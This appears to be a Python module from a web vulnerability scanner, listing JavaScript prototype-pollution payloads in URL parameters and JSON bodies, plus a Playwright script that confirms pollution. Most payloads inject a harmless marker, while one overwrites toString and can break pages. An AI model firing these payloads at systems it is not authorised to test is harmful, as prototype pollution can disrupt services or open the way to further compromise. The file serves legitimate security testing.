from __future__ import annotations

from typing import List, Dict, Any

class ProtoPollutionPayloads:
    # Client-side URL parameters
    CLIENT_URL_PAYLOADS = [
        "?__proto__[reconn_pp]=polluted",
        "?__proto__.reconn_pp=polluted",
        "?constructor[prototype][reconn_pp]=polluted",
        "#__proto__[reconn_pp]=polluted",
        "#constructor[prototype][reconn_pp]=polluted",
        "?__proto__[toString]=123", # Can break functionality
    ]

    # Server-side JSON payloads (Node.js sinks)
    SERVER_JSON_PAYLOADS = [
        {"__proto__": {"reconn_pp": "polluted"}},
        {"constructor": {"prototype": {"reconn_pp": "polluted"}}},
        # Nested pollution
        {"a": {"b": {"__proto__": {"reconn_pp": "polluted"}}}},
    ]

    # Verification scripts for Playwright
    CLIENT_VERIFY_SCRIPT = """
        (() => {
            if (window.reconn_pp === 'polluted' || ({}).reconn_pp === 'polluted') {
                return { status: 'confirmed', source: 'global' };
            }
            return { status: 'safe' };
        })()
    """
